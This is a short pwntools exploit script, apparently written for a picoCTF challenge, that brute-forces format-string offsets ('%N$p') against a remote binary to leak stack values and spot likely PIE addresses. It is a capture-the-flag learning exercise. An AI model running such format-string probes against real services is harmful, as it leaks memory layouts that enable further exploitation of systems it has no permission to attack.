from pwn import *

binary = context.binary = ELF('./vuln')
context.log_level = 'error'

REMOTE = True  # Set to True for remote
HOST = 'rescued-float.picoctf.net'
PORT = 60937

def leak_value(idx):
    if REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process(binary.path)

    payload = f"%{idx}$p".encode()
    try:
        p.sendline(payload)
        p.recvuntil(b"Enter your name:")  # adjust if needed
        leaked = p.recvline(timeout=1).strip()
        p.close()
        return leaked
    except:
        p.close()
        return b''

# Step 1: Brute-force format string stack offset
for i in range(1, 50):
    leak = leak_value(i)
    if leak:
        print(f"[{i:02}] -> {leak}")
        # Highlight likely PIE addresses (usually start with 0x55 or 0x56)
        if leak.startswith((b'0x55', b'0x56', b'0x5f', b'0x60', b'0x61', b'0x62', b'0x63', b'0x64', b'0x65')):
            print(f"  [*] Possible PIE address at offset {i}: {leak.decode()}")
